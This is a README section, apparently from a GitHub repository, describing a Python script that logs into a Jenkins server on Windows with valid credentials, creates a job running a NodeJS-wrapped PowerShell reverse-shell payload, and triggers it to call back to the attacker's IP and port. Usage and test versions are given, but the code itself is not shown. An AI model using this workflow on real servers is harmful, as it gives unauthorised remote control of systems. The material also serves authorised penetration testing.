## win_revshell_nodejs.py
This script is useful when you have valid credentials and want to check if it can be use to spawn a reverse shell.\
The Jenkins server must be installed on Windows. Windows must have [NodeJS](https://nodejs.org/en/download) application installed. Additionally, Jenkins must have the "[nodejs](https://plugins.jenkins.io/nodejs/)" plugin installed.\
To be able to receive a reverse shell, the user must have BUILD and JOB CREATION privileges.\
Once logged in on Jenkins, the script creates a new **"Freestyle project"** JOB.\
![win_revshell_nodejs_1](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_nodejs.py/images/win_revshell_nodejs_1.png)

Then configures or BUILD it to **"Execute NodeJS script"** with the **Powershell** payload.\
![win_revshell_nodejs_2](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_nodejs.py/images/win_revshell_nodejs_2.png)

Finally, the script sends the instruction to execute this JOB.

USAGE:\
python3 ./win_revshell_nodejs.py -w URL -r LOCAL_IP -rp LOCAL_PORT
![win_revshell_nodejs_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_nodejs.py/images/win_revshell_nodejs_3.png)
![win_revshell_nodejs_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_nodejs.py/images/win_revshell_nodejs_4.png)

Tested on Jenkins 2.150.2 and Windows 10 Pro 22H2 b.19045
